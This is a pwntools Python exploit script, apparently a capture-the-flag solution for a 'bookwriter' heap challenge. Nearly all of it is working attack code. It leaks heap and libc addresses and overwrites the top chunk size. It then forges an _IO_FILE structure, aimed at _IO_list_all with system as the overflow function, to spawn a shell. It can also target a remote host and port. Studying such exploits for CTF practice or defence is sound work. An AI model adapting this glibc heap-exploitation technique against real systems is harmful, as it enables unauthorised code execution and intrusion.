#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('bookwriter_patched')
libc = exe.libc

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def add_page(size, content):
    io.sendlineafter(b"choice :", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", content)

def view_page(idx):
    io.sendlineafter(b"choice :", b"2")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"Content :\n")
    leak = io.recv(6)
    return u64(leak.ljust(8, b"\x00"))

def edit_page(idx, content):
    io.sendlineafter(b"choice :", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendafter(b":", content)

def change_author(new_name=b"", change=False, trigger=b"0"):
    io.sendlineafter(b"choice :", b"4")
    io.recvuntil(b"Author : ")
    name = io.recvline()
    if change:
        io.sendlineafter(b"?", b"1")
        io.sendafter(b":", new_name)
    else:
        io.sendlineafter(b"?", trigger)
    return name

def solve():

    io.sendafter(b"Author :", b"A"*64)

    add_page(0x0, b"") # allocate a chunk of size 0 so oob allocation works 
    heap = u64(change_author()[64:64+4].ljust(8, b"\x00")) - 0x10
    info("heap base: %#x", heap)

    change_author(new_name=b"me!", change=True)
    add_page(0x18, b"B"*8)
    edit_page(0x1, b"A"*0x18)
    edit_page(0x1, b"C"*0x18 + p16(0xffb1) + p8(0))
    add_page(0xffb0, b"A")
    add_page(0x20, b"\x78")

    main_arena = view_page(3)
    libc.address = main_arena - 0x3c4278
    info("libc base: %#x", libc.address)

    for _ in range(5):
        add_page(0x0, b"") # don't wanna shrink the unsorted bin 

    flags = b"/bin/sh\0"
    size = 0x61
    fd = 0x00
    bk = libc.sym["_IO_list_all"] - 16

    write_base = 0x1
    write_ptr = 0x2
    mode = 0x00
    vtable = heap + 0x11d8
    overflow = libc.sym["system"]

    fake_io_file = flags + p64(size) + \
                    p64(fd) + p64(bk) +\
                    p64(write_base) + p64(write_ptr) +\
                    p64(0)*18 + p32(mode) + p32(0) +\
                    p64(0) + p64(overflow) + p64(vtable) 
    
    padding = p64(0x21) + p64(0) * 3 
    payload = p64(0) * 3 + p64(0x1011) + p64(0x0000000000000a31) + p64(0) * 0x200 + p64(0x21) + p64(0) * 3 + p64(0x31) + p64(0) * 5
    payload += padding * 4
    payload += p64(0x21) + p64(0) * 2
    payload += fake_io_file
    payload += p64(0xdeadbeef)

    edit_page(0, payload)
    change_author(trigger=b"0"*0x500)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

